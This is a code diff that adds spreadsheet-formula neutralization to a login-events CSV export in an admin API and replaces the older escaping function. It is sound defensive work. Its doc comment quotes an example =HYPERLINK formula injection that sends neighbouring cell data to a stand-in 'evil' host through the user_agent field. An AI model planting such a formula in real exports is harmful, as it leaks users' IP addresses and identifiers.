@@ -37,6 +37,23 @@ import {
 } from '../lib/media-lru-evict.js'
 import { uuidSchema } from '../lib/zod-uuid.js'
 
+/**
+ * CSV cell encoder for the login-events export.
+ *
+ * Beyond RFC-4180 quoting it neutralizes spreadsheet formulas: `user_agent` is
+ * attacker-controlled on every failed /auth/login, so a header of
+ * `=HYPERLINK("https://evil/?x="&A1,…)` lands verbatim in login-events.csv and
+ * executes when a moderator opens it — exfiltrating the real IPs and user ids
+ * sitting in the neighbouring cells. Applied to every column, not just the one.
+ */
+export function csvEscapeCell(v: unknown): string {
+  if (v == null) return ''
+  const raw = String(v)
+  const guarded = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
+  const s = guarded.replace(/"/g, '""')
+  return /[",\n]/.test(s) ? `"${s}"` : s
+}
+
 async function requireAdmin(
   request: Parameters<typeof getAuthUser>[0],
   reply: NonNullable<Parameters<typeof getAuthUser>[1]>
@@ -586,16 +603,11 @@ export const adminRoutes: FastifyPluginAsync = async (app) => {
     const wantsCsv =
       q.data.format === 'csv' || /text\/csv/i.test(request.headers.accept ?? '')
     if (wantsCsv) {
-      const escape = (v: unknown) => {
-        if (v == null) return ''
-        const s = String(v).replace(/"/g, '""')
-        return /[",\n]/.test(s) ? `"${s}"` : s
-      }
       const header = 'id,user_id,outcome,ip_address,user_agent,created_at\n'
       const body = rows
         .map((r) =>
           [r.id, r.user_id, r.outcome, r.ip_address, r.user_agent, r.created_at]
-            .map(escape)
+            .map(csvEscapeCell)
             .join(',')
         )
         .join('\n')
